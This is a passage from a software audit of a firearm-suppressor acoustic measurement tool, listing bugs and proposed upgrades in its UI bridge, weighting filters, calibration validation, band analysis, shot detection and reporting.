**Fix:** Fold this into the light-theme/report work rather than treating it as a separate fix: expose figsize and a base font scale as parameters, replace bbox_inches='tight' with constrained_layout=True so every deliverable has identical geometry, and in plot_band_exposure label only the decade bands horizontally while ticking the rest unlabelled.


### stdout chunks are split on newline with no remainder buffer, so long lines are torn and the output-directory regex can capture a truncated path

`ui/bridge/python-bridge.js:96` · UI & Presentation

```python
this.process.stdout.on('data', (data) => {
        const text = data.toString();
        stdout += text;
        const lines = text.split('\n').filter(Boolean);
```

**Failure:** Node delivers stdout in arbitrary 64 KB chunks, not lines. When a chunk boundary falls inside `Output directory: /Users/graham/Library/CloudStorage/GoogleDrive-.../Audio/analysis/range_test_20260811_1432` (this repo's paths are ~140 chars), the dirMatch at line 110 captures only the leading fragment. `lastOutputDir` becomes a nonexistent path, the client receives `{type:'complete', outputDir:'/Users/graham/Library/Cl'}`, /api/results returns 400, and app.js:205 swallows it into console.error — the user sees "Analysis complete" and lands on an empty Results view with no error. The same tearing garbles the live log display.

**Fix:** Carry a remainder: `const buf = this._tail + text; const lines = buf.split('\n'); this._tail = lines.pop(); for (const line of lines) {...}` and flush this._tail on 'close'. Better and cheap: have main.py print one machine-readable terminator (e.g. `SASA_RESULT {"output_dir": "..."}`) after main.py:1004 and parse that as JSON instead of regexing three English prose variants.


### A 'complete' message with a null outputDir shows "100% — Analysis complete" and then does nothing

`ui/renderer/app.js:130` · UI & Presentation

```python
} else if (msg.type === 'complete') {
        progressFill.style.width = '100%';
        progressPct.textContent = '100%';
        logOutput.textContent += '\n--- Analysis complete ---\n';
        if (msg.outputDir) {
```

**Failure:** python-bridge.js:131 resolves with `outputDir: lastOutputDir` which is null whenever the regex missed (chunk tearing, or a future wording change in main.py's completion banner). The UI declares success at 100%, then silently skips loading results and stays on the Analyze view. The operator believes the analysis produced nothing, when in fact a complete result set is sitting in Audio/analysis. No error, no link, no fallback.

**Fix:** If outputDir is falsy on 'complete', fall back to `GET /api/analyses` and load the newest entry; if that fails too, show a warning with an 'Open History' action rather than declaring 100% complete with no destination. Fixing the source (a machine-readable result line from main.py, see no-line-buffering-in-bridge) removes the case entirely.


### The primary button ships disabled at 1.95:1 with no explanation of what would enable it

`ui/renderer/index.html:216` · UI & Presentation

```python
<button class="btn-run" id="btn-run" disabled>
```

**Failure:** On first load the only call to action is a blue button at `opacity: 0.35` (styles.css:536-539). Composited, its label is 1.95:1 against the page — a ghost. Nothing anywhere says "select a file first"; the file card is a separate panel further up with no visual link to the button. A first-time user's reasonable conclusion is that the application is broken or unlicensed. The disabled state also carries no `aria-disabled`/`aria-describedby`, so assistive tech gets no reason either.

**Fix:** Add a persistent helper line under the button ('Select an input file to enable analysis') wired via aria-describedby, and lift the disabled treatment off blanket opacity to an explicit disabled fill/label pair around 3:1 so the control still reads as a control. Keep it disabled rather than the proposed click-then-validate — disabled + a stated reason is the clearer pattern here.


### html/body overflow:hidden with a non-scrolling sidebar makes navigation unreachable at 200% zoom

`ui/renderer/styles.css:62` · UI & Presentation · WCAG 2.2 SC 1.4.4 Resize Text; SC 1.4.10 Reflow

```python
html, body {
  height: 100%;
  overflow: hidden;
  font-family: var(--font-sans);
  font-size: 13px;
```

**Failure:** `.sidebar` (styles.css:99-107) is a fixed 220px flex column with `padding: 20px 0` and no `overflow-y`. At 200% browser zoom in a 1280x800 window the brand block, three nav items and the footer exceed the 400 CSS-px viewport height; because the document root cannot scroll and the sidebar has no scroll of its own, the History nav item and the footer are clipped off-screen with no way to reach them. Base font size is also hard-set to 13px rather than a rem-relative value, so a user who has raised their OS/browser default font size sees no change at all.

**Fix:** Add `min-height: 0; overflow-y: auto` to .sidebar-nav and `overflow-y: auto` to .sidebar — that alone fixes the unreachable-nav case and is safe. Dropping `overflow: hidden` from html/body is riskier (the app is built as a fixed two-pane shell) and should be done together with a rem-based type scale, verified at 320px width and 400% zoom, not as a drive-by.


### Shot summary images are matched to shots by lexicographic filename order, which breaks past 99 shots

`ui/server.js:119` · UI & Presentation

```python
const shotFiles = fs.readdirSync(shotsDir).filter(f => f.endsWith('.png')).sort();
      for (const f of shotFiles) shotImages.push(f);
```

**Failure:** main.py:700 writes `shot_{shot.shot_number:02d}_summary`, which is only zero-padded to two digits. A 120-round belt/string produces shot_100_summary.png ... shot_120_summary.png, and a default lexicographic sort orders shot_100 before shot_99. app.js:357-360 then indexes `state.shotImages[idx]` positionally against `agg.shots[idx]`, so from shot 100 onward the displayed summary figure belongs to a different shot than the metric cards above it. The same misalignment occurs whenever a single per-shot figure fails to save.

**Fix:** Zero-pad to 4 digits at main.py:700 and 963 and sort with `localeCompare(b, undefined, {numeric: true})` at server.js:119. The durable fix is to have server.js return `{shot_number, file}` pairs parsed from the filename and have app.js:357 look up by shot_number instead of array position — that also fixes the missing-figure case, which padding alone does not.


### Spectrograms weight with the exact analytic curve while per-shot metrics weight with the warped, doubled IIR — the two disagree by tens of dB

`STFT.py:212` · Weighting & Calibration · IEC 61672-1:2013 Table 2

```python
weights = a_weight_linear(frequencies)
        magnitude = magnitude * weights[:, np.newaxis]   # STFT.py:212-213
        ...
        c_dB = c_weight_frequency_response(frequencies)
        weights = 10.0 ** (c_dB / 20.0)                  # STFT.py:217-218
```

**Failure:** STFT.py applies weighting in the frequency domain from a_weight_frequency_response / c_weight_frequency_response, which this audit confirmed are correct (the analytic formula plus +2.0 dB gives 0.000344 dB at 1000 Hz, and matches the IEC tabulated values to within the nominal-vs-exact-frequency rounding: 31.5 -> -39.53 vs -39.4, 63 -> -26.22 vs -26.2, 125 -> -16.19 vs -16.1, 4000 -> +0.96 vs +1.0, 8000 -> -1.15 vs -1.1, 16000 -> -6.71 vs -6.6; C at 1000 Hz with +0.062 gives 0.000098 dB). metrics.py instead uses the bilinear IIR run through sosfiltfilt. So for the SAME shot at fs=48 kHz, the A-weighted spectrogram shows a 125 Hz component at -16.19 dB while the LAE/Lpeak_A that the report prints beside it were computed with that component at -32.42 dB, and a 16 kHz component appears at -6.71 dB in the spectrogram but is weighted -13.14 dB (single pass) or -26.3 dB (doubled) in the metrics. An analyst cross-checking the headline numbers against the picture cannot reconcile them, and the discrepancy looks like a data problem rather than a filter problem. weighting.py's own --plot self-test (weighting.py:521-534) draws exactly these two curves on the same axes and would make the divergence visible, but nothing asserts on it and it is not part of any run.

**Fix:** Fix the root cause (single causal pass in metrics.py) and this mostly disappears; the remaining gap is the bilinear warping above ~8 kHz. Then add a startup self-check that compares the designed IIR response against a_weight_frequency_response/c_weight_frequency_response over 10 Hz - min(20 kHz, 0.45*fs) at the file's actual sample rate and records the max deviation in the report, so any future divergence is visible. Correct the example when writing this up: the pipeline emits Z and C spectrograms only.


### Calibration validation uses `<= 0` comparisons, which NaN and Infinity pass — every reported dB becomes NaN

`calibration.py:59` · Weighting & Calibration

```python
if self.Pa_per_FS <= 0:
            raise ValueError(f"Pa_per_FS must be positive, got {self.Pa_per_FS}")   # calibration.py:58-60

        if sensitivity_mV_per_Pa <= 0: ...
        if V_per_FS <= 0: ...   # calibration.py:88-91
```

**Failure:** NaN compares False against every relational operator, so all three guards let it through. Verified: Calibration(Pa_per_FS=float('nan')) constructs successfully with is_calibrated()=True, and Calibration.from_sensitivity(10.0, float('nan')) returns Pa_per_FS=nan. This is reachable from user input: AnalysisConfig.from_json (main.py:113-117) uses json.load, and Python's json accepts the non-standard literals NaN, Infinity and -Infinity by default — verified: json.loads('{"Pa_per_FS": NaN}') returns {'Pa_per_FS': nan}. So `python main.py rec.wav --config cfg.json` with `"Pa_per_FS": NaN` (or Infinity) runs to completion, produces NaN for every level, detects zero shots (the threshold comparison against NaN is always False), and writes NaN into the results JSON — which json.dump emits as the bare token `NaN`, invalid JSON that the UI's JSON.parse will reject with an opaque error rather than a calibration complaint.

**Fix:** In Calibration.__post_init__ and from_sensitivity use `if not (math.isfinite(v) and v > 0): raise ValueError(...)`. Add a plausibility band (reject Pa_per_FS outside ~1e-3..1e5, naming the implied 0 dBFS level in dB SPL in the message) - that catches ordinary typos, which matters more than the NaN case. Load config with json.load(..., parse_constant=_reject) and write results with json.dump(..., allow_nan=False) so an invalid number can never reach the UI as malformed JSON.


# Upgrades


## Critical (2)


### No net suppression / insertion loss against an unsuppressed reference — the primary number a suppressor test exists to produce

`metrics.py:598` · Acoustic Metrics · MIL-STD-1474E (weapon noise measurement) and common suppressor-industry practice (net reduction reported as mean ± σ over N shots)

```python
def compute_aggregate_metrics(
    shot_metrics_list: List[ShotMetrics],
) -> AggregateMetrics:
```

**Failure:** grep across main.py, app.py, metrics.py and ui/ for 'insertion.loss|net.suppression|unsuppressed|reference.shot' returns nothing. The tool computes absolute levels for one recording and stops. A suppressor is characterised by the DIFFERENCE against an unsuppressed reference fired with the same weapon, ammunition lot, mic position and atmosphere — and by the uncertainty on that difference, which is not the uncertainty on either absolute level (correlated errors in calibration, distance and atmosphere largely cancel in the difference). As shipped, an operator must hand-compute the delta in a spreadsheet, losing the paired structure and any correct propagation of shot-to-shot variance.

**Fix:** Add a paired-comparison mode taking a reference (unsuppressed) and a test (suppressed) AnalysisResult and reporting ΔLpeak_Z, ΔLpeak_C, ΔLAE, ΔLAImax with a Welch confidence interval on the per-shot values (strings are usually unequal-n and unequal-variance; a true paired-t requires shot-by-shot pairing that does not exist here), plus the per-1/3-octave-band insertion-loss spectrum from the band_exposure_dB arrays. Require and persist a match on Pa_per_FS, sample rate and the measurement-metadata block (see the metadata upgrade) and refuse the delta when they differ. Sequence this AFTER the sosfiltfilt weighting fix — an A-weighted delta computed from doubled weighting curves is worse than no delta, because the bias is spectrum-dependent and inflates apparent suppression.


### No acoustic calibration-tone (pistonphone / 94 dB / 114 dB) workflow — the single most important missing feature

`calibration.py:62` · Weighting & Calibration · IEC 60942 (sound calibrators); IEC 61672-1:2013 §5.1.6 and Annex B (periodic acoustic calibration and traceability)

```python
@classmethod
    def from_sensitivity(
        cls,
        sensitivity_mV_per_Pa: float,
        V_per_FS: float,   # calibration.py:62-68   -- only datasheet-number entry exists
```

**Failure:** A repo-wide grep for pistonphone/calibrator/cal-tone finds only prose in README.md:266 and a synthetic 94 dB test signal inside bands.py's CLI demo (bands.py:430-433). There is no code path anywhere that ingests a recorded calibrator tone and derives Pa_per_FS from it — the hardcoded 143.96 was apparently derived by hand from one 114 dB tone (main.py:79-80) and then frozen into the source. Every acoustic lab calibrates by placing a Class 1 calibrator (B&K 4231, GRAS 42AG, etc.) on the mic and recording a 1 kHz tone at 94.0 or 114.0 dB before and after each session, because the datasheet route this tool forces cannot capture the things that actually move the number: the recorder's gain-knob position, input pad/attenuator state, cable losses, preamp gain drift, temperature and static-pressure effects on the capsule (a calibrator level itself needs a barometric correction), and any mic ageing since the last certificate. The datasheet route also silently assumes the recorder's gain is at some particular setting, which is exactly the variable most likely to differ between the suppressed and unsuppressed runs of the same comparison — an undetected gain change between takes makes the entire suppression delta wrong while every number still looks plausible. Without a tone workflow no result from this tool is defensible in a test report or traceable to a national standard.

**Fix:** Add Calibration.from_tone_file(wav, reference_dB=94.0|114.0, tone_Hz=1000.0, channel=0) that locates a steady segment, verifies single-tone dominance and level stability, verifies no clipping, computes RMS over an integer number of cycles, and derives Pa_per_FS = (20e-6 * 10**(reference_dB/20)) / rms_FS. Use exactly that expression - the reference level is already an RMS quantity, so there is no sqrt(2) factor (the finding's first expression is wrong). Set method='tone' and store provenance (calibrator model/serial, certificate expiry, reference level, tone file path, operator, timestamp). Wire in --cal-tone FILE --cal-level 114 and make it the first option in the UI's cal-mode select (ui/renderer/index.html:112-116), ahead of the 143.96 default. Support pre/post-session tones with a drift report and a configurable fail threshold.


## High (23)


### Add the standard decimation cascade for low-frequency bands instead of running every band at the full sample rate

`bands.py:156` · Bands & Spectral · ANSI S1.11 / IEC 61260-1 implementation practice for low-frequency fractional-octave bands.

```python
for fc in self.center_frequencies:
            f_low, f_high = compute_band_edges(fc)
            ...
            sos = design_bandpass_sos(f_low, f_high, self.sample_rate, self.filter_order)
```

**Failure:** Every band is designed and run at the raw sample rate, which is precisely why the 0.001 clamp was introduced. At 192 kHz the 20 Hz band has a normalized bandwidth of 4.8e-5 -- workable in float64 SOS (measured 0.00 dB passband gain) but with no design margin -- and running 37 full-rate filters over 23 million samples is what drives the 20 GB memory figure. The industry-standard approach (ANSI S1.11 Annex, and every commercial analyser) is to decimate by 2 per octave group so every filter sees a comparable normalized bandwidth.

**Fix:** Group bands into octave sets; for each set whose f_high < fs/20, decimate by 2 (scipy.signal.decimate with an order-8 Chebyshev-I or an FIR half-band), design that octave's three 1/3-octave filters at the reduced rate, and resample the level frames onto the common hop grid. Sequence this AFTER simply deleting the clamp - I measured the unclamped 20 Hz filter at 192 kHz to be stable with 0.00 dB passband gain, so the clamp fix restores correctness immediately and the cascade is the performance/margin follow-up.


### No 1/3-octave insertion-loss (suppressed vs unsuppressed) output -- the single most important suppressor deliverable is absent

`bands.py:334` · Bands & Spectral · Common practice in MIL-STD-1474E suppressor evaluation and in the commercial suppressor-testing industry.

```python
def compute_band_exposure(
    band_levels_dB: np.ndarray,
    time_s: np.ndarray,
) -> np.ndarray:
```

**Failure:** The module produces per-band SEL for one recording only (called once at metrics.py:512). A suppressor evaluation is fundamentally a comparison: the deliverable is the per-band reduction, unsuppressed minus suppressed, with a dispersion statistic across the shot string, because a can giving 30 dB at 1 kHz and 8 dB at 100 Hz is a very different product from one giving 20 dB flat. There is no pairing of recordings, no differencing and no shot-to-shot statistic anywhere in the codebase, so the tool cannot answer the question it exists to answer.

**Fix:** Add a comparison entry point (e.g. `sasa compare --reference unsuppressed.wav --test suppressed.wav`) that runs the existing pipeline on both, then reports per-band mean insertion loss = mean(reference band SEL) - mean(test band SEL) with standard deviation and a 95% CI across the shot string, plus per-band and broadband Lpeak reduction. Emit a CSV and a band-vs-insertion-loss plot with error bars. Note this is only trustworthy after the clamp and Class-1 defects are fixed, since today the 20-100 Hz rows are duplicates.


### Ship a runnable filter-bank and spectrogram conformance self-test; the repository currently contains no tests at all

`bands.py:400` · Bands & Spectral · IEC 61260-2 / IEC 61260-3 pattern-evaluation and periodic-test philosophy applied to a software analyser.

```python
def main() -> int:
    """Test 1/3-octave band analysis."""
```

**Failure:** bands.py's 'test' CLI only prints max and mean levels; it asserts nothing and would print equally plausible numbers with every defect above present -- indeed the eight-identical-low-bands bug is visible in its own output table and passes unremarked. There is no way for a customer, an auditor, or a future maintainer to demonstrate that the analyser produces correct dB values, which is fatal for numbers meant to be defensible against MIL-STD-1474E and IEC 61260-1.

**Fix:** Add a tests/ directory with pytest cases asserting, at fs = 48/96/192 kHz: (1) each band reports 94.00 +/- 0.1 dB for a 94 dB sine at its own exact midband frequency; (2) each designed filter satisfies the IEC 61260-1 Table 1 class-1 mask at fm*G^(Omega/6) for Omega in {1, 1.5, 2, 3, 4}; (3) sum of band powers matches the band-limited broadband Leq of white noise within the documented ENBW residual (currently +0.13 dB measured); (4) all bands peak within one hop of an impulse; (5) 10*log10(sum of spectrogram bins) equals the broadband Leq at every nperseg; (6) a 94 dB bin-centred tone reads 94.00 dB for every window type. Add a --self-test flag that prints the pass/fail table into the analysis output directory.


### Emit a full measurement-provenance and validity block so results are defensible against a standard

`main.py:153` · Shot Detection & Sampling · MIL-STD-1474E; IEC 61672-1 reporting requirements

```python
def to_dict(self) -> Dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'input_file': str(self.input_file),
            'output_dir': str(self.output_dir),
```

**Failure:** The current analysis_metadata.json records the input path, Pa_per_FS, sample rate, duration and n_shots — and nothing about whether the measurement is valid. Absent from the record: bit depth, channel count and which channel was analysed, clipping/over-range counts, the actual detection threshold used, per-shot window truncation, per-shot SNR against background, the band set and effective bandwidth, whether the source was resampled or transcoded from video, and the source video's identity and hash. A suppressor manufacturer quoting these numbers in a datasheet, or a customer auditing them, cannot reconstruct or defend the measurement from what the tool writes. This is what separates a measurement instrument from a plotting script.

**Fix:** Add a measurement_validity block to AnalysisResult.to_dict carrying source hash, container/codec/bit depth/channels/sample rate (original vs as-analysed with a resampled flag), Pa_per_FS with provenance and calibration date, clipping counts, detection method and effective threshold, and per shot {snr_dB, truncated_pre, truncated_post, clipped, multi_event, valid}. Promote band metadata to that top-level block rather than leaving it per shot. Render it as a commented header on metrics_summary.csv and a footer on every figure, and make compute_aggregate_metrics skip shots with valid=false. This block is the natural carrier for the flags introduced by the clipping, truncation, multichannel and SNR-gate fixes, so it should land after them, not before.


### Replace threshold-crossing detection with a hysteresis onset detector plus a per-shot SNR gate

`shot_detect.py:116` · Shot Detection & Sampling · ANSI S12.7 signal-to-noise requirement for impulse measurement

```python
# Find all samples above threshold
    above = envelope > threshold
```

**Failure:** A best-in-class blast analyser detects the ARRIVAL of an impulse, not the fact that a level is high. A dual-threshold (Schmitt) arm/disarm on the envelope, combined with an onset-strength function (positive half-wave rectified envelope derivative in dB/ms) and prominence-based peak picking, would fix the region-collapse and refractory under-counting simultaneously and would keep working in reverberant spaces where the current absolute-threshold approach cannot. It should also measure the ambient/background level in the quiet region preceding each shot and reject or flag any shot whose peak is less than ~20 dB above the local background, since a measurement without that margin is not defensible.

**Fix:** Implement as proposed, but sequence it: (1) add background_dB/snr_dB/valid to ShotEvent computed over the existing pre-trigger region and require snr_dB >= 20 to enter compute_aggregate_metrics - this alone is a small change with immediate defensibility value; (2) then replace detect_peaks_above_threshold with find_peaks on the dB envelope using distance=refractory_samples/envelope_hop and a prominence in dB, plus the Schmitt arm/disarm pair. Keep the old detector behind a config flag for one release and report both counts, since every existing customer result will shift.


### Ship a `sasa selftest` command that verifies the instrument against analytical references before every measurement session

`main.py:1010` · Engineering Quality · IEC 61672-3 (periodic verification)

```python
def main() -> int:
    """Main entry point with CLI argument parsing."""
```

**Failure:** There is no way for an operator at a range to confirm the installed build measures correctly. If a numpy/scipy upgrade, a corrupted install, or a bad UPX-compressed binary (sasa.spec sets upx=True on both platforms, which is a known source of silent corruption in scientific binaries) alters a filter coefficient, the tool produces plausible-looking but wrong dB values and nobody finds out. Every real class 1 sound level meter has a self-check; this one has none.

**Fix:** Implement `sasa selftest` as a subcommand in main.py's argparse block (main.py:1010-1070), reusing the analytical fixtures from tests/ so there is exactly one source of expected values. Emit PASS/FAIL per check plus a result hash into analysis_metadata.json. Drop upx=True from sasa.spec:131/143/183 regardless — it also blocks macOS codesigning (see no-codesign-notarize) — and run the selftest against the frozen binary in CI before upload.


### No mic distance, angle, height, temperature, humidity or barometric pressure captured — the measurement is not reproducible and cannot be distance- or atmosphere-normalised

`main.py:75` · Acoustic Metrics · ISO 9613-1:1993 (atmospheric attenuation); MIL-STD-1474E measurement-configuration requirements; ISO/IEC 17025 §7.8 (reporting)

```python
@dataclass
class AnalysisConfig:
    """Configuration for analysis."""
    # Calibration
    Pa_per_FS: float = 143.96
```

**Failure:** grep for 'humidity|barometric|temperature|mic_distance|distance_m|azimuth|angle' across main.py, app.py, metrics.py and ui/ returns nothing. AnalysisConfig carries only Pa_per_FS, detection thresholds, STFT parameters and plot options; AnalysisResult.to_dict (main.py:150-172) records the calibration factor and sample rate but nothing about the physical measurement. A reported Lpeak of 137 dB is meaningless without at minimum the mic distance and the azimuth from the bore — 1 m vs 1.6 m is 4 dB of spherical spreading alone, and muzzle-blast directivity varies by well over 10 dB between 90° left of the muzzle and the shooter's ear. Two operators can produce a 10 dB disagreement on the same suppressor and the reports will contain nothing that explains it. There is also no capture of mic model/serial, calibrator model and last-calibration date, weapon, barrel length, or ammunition lot — so a result cannot be defended or reproduced.

**Fix:** Split into two items of very different confidence. (a) Do now: a MeasurementMetadata dataclass persisted verbatim into the JSON and stamped on every plot — mic distance, azimuth/elevation from bore, mic height AGL, mic and preamp model/serial, calibrator model/level/date, sample rate and bit depth, temperature, RH, barometric pressure, wind, ground surface, weapon, barrel length, ammunition lot, operator. Warn loudly when absent. This is cheap and is the single largest defensibility gain in the list. (b) Treat distance/atmosphere normalisation as a guarded, clearly-labelled extra, not a default: spherical spreading plus ISO 9613-1 absorption is a linear small-signal model, and muzzle blast near the mic can be weakly nonlinear, so always report the as-measured value as primary and the normalised value as derived, stating the model and refusing to emit it when the required metadata is missing.


### No hearing-hazard dose: no MIL-STD-1474E allowable rounds per day, no AHAAH, no LAeq8h / NIOSH percent-dose

`metrics.py:86` · Acoustic Metrics · MIL-STD-1474E Appendix B/D; NIOSH Publication 98-126; ISO 1999

```python
# Gunshot-specific metrics
    rise_time_us: float = 0.0       # 10-90% rise time in microseconds
    b_duration_ms: float = 0.0      # B-duration: time within 20 dB of peak (ms)
```

**Failure:** README.md:655 invokes 'MIL-STD-1474E: 140 dB peak' as the reason Lpeak matters, but nothing in the codebase evaluates any limit or dose — grep for '1474|allowable|rounds.per.day|AHAAH|LAeq8' across all Python and UI sources returns only the two comment mentions at metrics.py:351 and README prose. The operationally decisive question for a suppressor is not 'what is Lpeak' but 'how many rounds per day may be fired at this position, with and without hearing protection' — a number the tool has all the inputs for (per-shot LAE, peak, B-duration, round count) and does not produce.

**Fix:** Ship in two tiers. Tier 1, implementable now from existing fields: LAeq,8h = 10*log10(sum(10^(LAE_i/10))/28800), NIOSH and OSHA percent dose, and explicit pass/fail columns against the 140 dB peak criterion and the 8-hour criterion, with the assumed HPD attenuation and round count recorded as inputs in the JSON. Tier 2, separate project: MIL-STD-1474E allowable-rounds-per-day and AHAAH ADRD, which require a validated model implementation and its own verification suite — do not present a hand-rolled approximation of either as a MIL-STD result. Note Tier 1's LAE inputs are wrong until the sosfiltfilt A-weighting bug is fixed.


### No A-duration, no positive-phase duration, no specific impulse, and no first-peak/reflection separation

`metrics.py:86` · Acoustic Metrics · MIL-STD-1474E Appendix D; ANSI S12.7-1986 (measurement of impulse noise: A-duration, B-duration, impulse)

```python
rise_time_us: float = 0.0       # 10-90% rise time in microseconds
    b_duration_ms: float = 0.0      # B-duration: time within 20 dB of peak (ms)
    crest_factor_dB: float = 0.0    # Peak-to-RMS ratio in dB
```

**Failure:** B-duration is the only duration metric implemented. MIL-STD-1474E's blast-wave characterisation rests on A-duration (the positive overpressure phase, onset to first zero crossing) as much as on B-duration, and blast physics is normally reported with the specific impulse I⁺ = ∫p dt over the positive phase. None of these exist. There is also no separation of the direct arrival from ground/structure reflections: because every metric is computed over the whole 250 ms window and rise time keys off argmax(|p|) globally, a reflection arriving 3 ms later can and does become the 'peak' (demonstrated in the rise-time finding, where argmax landed on a reflection at 4.00 ms). Without an explicit direct-arrival gate, Lpeak, rise time and A-duration can all be describing a reflection off the ground or shooting-bench rather than the muzzle blast.

**Fix:** Add A_duration_us (onset to first negative-going zero crossing of the high-passed pressure), positive_phase_impulse_Pa_s (trapezoidal integral over that interval), negative_phase_duration_us and impulse, and peak_overpressure_Pa (signed positive peak) to ShotMetrics, to_dict() and the CSV fieldnames. These share the onset detector and high-pass with the rise-time fix — implement them together. Treat the direct-arrival gate as a separate, lower-confidence item: a geometry-derived exclusion window requires mic-height metadata that does not exist yet (see the metadata upgrade), so ship first the cheap diagnostic — report the level and delay of the largest excursion outside the first 2 ms so an operator can see reflection contamination without needing the geometry.


### No clipping or overload detection anywhere — a saturated recording yields a confidently-reported Lpeak that is only a lower bound

`metrics.py:466` · Acoustic Metrics · IEC 61672-1:2013 clause 5.19 (overload indication is mandatory for a sound level meter)

```python
Lpeak_Z = float(amplitude_to_dB_SPL(compute_peak(x_z)))
    Lpeak_A = float(amplitude_to_dB_SPL(compute_peak(x_a)))
    Lpeak_C = float(amplitude_to_dB_SPL(compute_peak(x_c)))
```

**Failure:** grep for 'clip|overload|saturat' across all Python sources finds only an unrelated moviepy VideoFileClip and a comment in SignalGenerator. Gunshot recording is the single most clipping-prone task in acoustics — gain that is correct for a suppressed .22 saturates on an unsuppressed .308, and the flat-topped waveform still produces a perfectly plausible-looking Lpeak. Because the peak is clamped at full scale, the reported Lpeak becomes exactly 20·log10(Pa_per_FS/20e-6) for every clipped shot regardless of the true level, and — worse for this product — clipping REMOVES the high-frequency shock front, which lowers the measured spectral centroid and lengthens the measured rise time, i.e. it makes an unsuppressed shot look suppressed.

**Fix:** Detect at load, per channel and BEFORE the mono mixdown at WavLoader.py:85/117 and shot_detect.py:438 — averaging channels pulls a flat-topped sample back below full scale and hides the clipping, which the original fix does not account for. Count samples within 1 LSB of ±1.0 and flag runs of >=2 consecutive. Add clipped_samples, clipped_runs and overloaded to ShotMetrics, to_dict() and the CSV fieldnames (main.py:333); mark overloaded shots on plots; exclude them from compute_aggregate_metrics by default and report how many were excluded. Render a clipped shot's Lpeak as a lower bound ('>= X dB'), and warn when the peak is within 3 dB of full scale.


### Add in-app calibration from a calibrator tone recording with mandatory pre/post drift check

`main.py:124` · Pipeline & I/O · IEC 61672-1 §5.1 and §9; MIL-STD-1474E §5.1.3 (pre- and post-test calibration and drift limits)

```python
def get_calibration(self) -> Calibration:
        """Create Calibration object from config."""
        if self.sensitivity_mV_per_Pa is not None and self.V_per_FS is not None:
```

**Failure:** Today the only route to Pa_per_FS is a number the operator computed by hand offline — main.py:79 records that the shipped default came from manually comparing "digital RMS vs reference" on one file. No code path anywhere ingests a calibrator recording, and there is no concept of a post-test calibration check, so sensitivity drift over a hot range day goes undetected and unrecorded. A 0.5 dB drift between pre- and post-test tones invalidates the session and SASA cannot notice it.

**Fix:** Add `Calibration.from_calibrator_tone(samples, sr, level_dB=114.0, freq_Hz=1000.0)` computing Pa_per_FS = (P_REF * 10^(level_dB/20)) / rms_FS over a band-limited window, plus --calibrate-pre/--calibrate-post/--calibrator-level-dB/--calibrator-freq flags and UI fields. Store pre, post and drift_dB in analysis_metadata.json, warn above 0.2 dB and fail above 0.5 dB. Severity high rather than critical: the underlying wrong-number risk is already captured by hardcoded-default-calibration-marked-calibrated, which must be fixed regardless of whether this lands.


### No customer-deliverable report — outputs are loose PNG/HTML/CSV/JSON in a timestamped folder

`main.py:707` · Pipeline & I/O · ISO/IEC 17025 §7.8 (reporting of results)

```python
print("\n[6/6] Saving data files...")
    csv_path = output_dir / "metrics_summary.csv"
```

**Failure:** A suppressor manufacturer receives a folder of unlabelled images and a CSV with unitless headers. Nothing ties the numbers to test conditions, calibration, software version or operator, so the customer must reconstruct the report by hand — and any single number can be quoted out of context with no provenance attached.

**Fix:** Add a report.py producing one self-contained HTML (assets base64-inlined, same technique as save_interactive_*_html) with a PdfPages sibling: cover page with test metadata and calibration record, per-shot table with units and references, aggregate stats with n and standard deviation, the existing figures, a methods/standards statement, software version and input SHA-256, and a warnings page. Sequence it after the test-metadata and provenance work — without those inputs the report has nothing to put on its cover page.


### No paired unsuppressed-vs-suppressed comparison and no batch mode — the actual deliverable of suppressor testing

`main.py:735` · Pipeline & I/O

```python
def analyze_file(
    wav_path: Path,
    config: AnalysisConfig,
    output_base: Optional[Path] = None,
) -> AnalysisResult:
```

**Failure:** The pipeline analyses exactly one file per invocation and produces no comparison primitive. To report "32 dB net reduction" the operator must run SASA twice and subtract numbers in a spreadsheet by hand — losing shot-count weighting, the pairing of conditions, and any uncertainty propagation. There is also no batch mode: N files require N invocations and N output directories with no combined summary.

**Fix:** Implement compare as a subcommand consuming two existing analysis_metadata.json files (not two WAVs) — that keeps analyze_file untouched, makes the comparison re-runnable without re-analysis, and naturally enforces the calibration/geometry match by diffing the recorded config and metadata blocks. Emit net reduction per metric with mean, SD, n and a 95% CI on the difference, plus per-1/3-octave-band deltas. Add `--batch` glob mode writing one combined CSV. Note the per-band delta depends on band_exposure_dB, which is silently empty when band analysis fails (metrics.py:516) — handle that case explicitly.


### Ambient noise floor is never measured and no per-shot SNR gate exists

`main.py:798` · Pipeline & I/O · ISO 1996-2 Annex A (background correction); MIL-STD-1474E §5.2.5

```python
# Detect shots
    print("\n[3/6] Detecting shots...")
    shots = detect_shots(
```

**Failure:** Nothing measures the pre-trigger ambient level, so a suppressed .22 whose report is only 8 dB above range background wind noise is reported to 0.1 dB as if it were clean. The 200 ms LAE integration window is then dominated by background energy, biasing SEL upward by several dB with no indication.

**Fix:** Compute an ambient Leq from the low-percentile portion of the envelope already built in detect_shots and return it alongside the shots; add per-shot `snr_dB` from the pre-trigger window versus the shot peak, and write ambient_LAeq_dB plus per-shot snr_dB to the JSON and CSV. Flag shots below ~10-15 dB SNR rather than rejecting them by default. Be cautious with background subtraction on energy metrics — apply it only when SNR is in the 6-15 dB correctable band and record that a correction was applied, per ISO 1996-2 practice.


### Per-shot review with the ability to reject a bad shot and see aggregates recompute

`ui/renderer/app.js:295` · UI & Presentation

```python
function renderShotNav(meta, shotImages) {
    const agg = meta.aggregate || {};
    const shots = agg.shots || [];
```

**Failure:** The shot pills are read-only. When the detector fires on a squib, a bolt slap, a neighbouring lane, or a wind gust, that event is silently folded into the mean LAE and (worse) may become the reported Lpeak_Z_max headline number. The operator can see the bad shot's waveform in the per-shot tab but has no way to exclude it short of re-running with different thresholds and hoping.

**Fix:** As proposed. Recompute means and SDs client-side from the included set — note LAE and LAFmax means must be recomputed in the energy domain, not by averaging dB values, to match metrics.py. Persist the exclusion list with reasons back into analysis_metadata.json (needs a small write endpoint in server.js) so the audit trail survives into any report. Show 'n = 9 of 10 (1 excluded)' next to every aggregate, and mark excluded pills with a strikethrough plus an icon rather than colour alone.


### Add A/B comparison — the product's entire purpose is suppressed vs unsuppressed and the UI cannot show two recordings together

`ui/renderer/index.html:242` · UI & Presentation

```python
<section class="view" id="view-results">
        <div class="view-header">
          <h1>Analysis Results</h1>
```

**Failure:** The Results view is hardcoded to a single `state.currentOutputDir`. To compare a suppressed and an unsuppressed string an operator must load one, note the numbers by hand, load the other, and subtract mentally — with no shared colour scale on the spectrograms (see the colour-scale finding), so even the visual comparison is invalid. Suppression reduction in dB, the single number a customer buys, is never computed anywhere in the product.

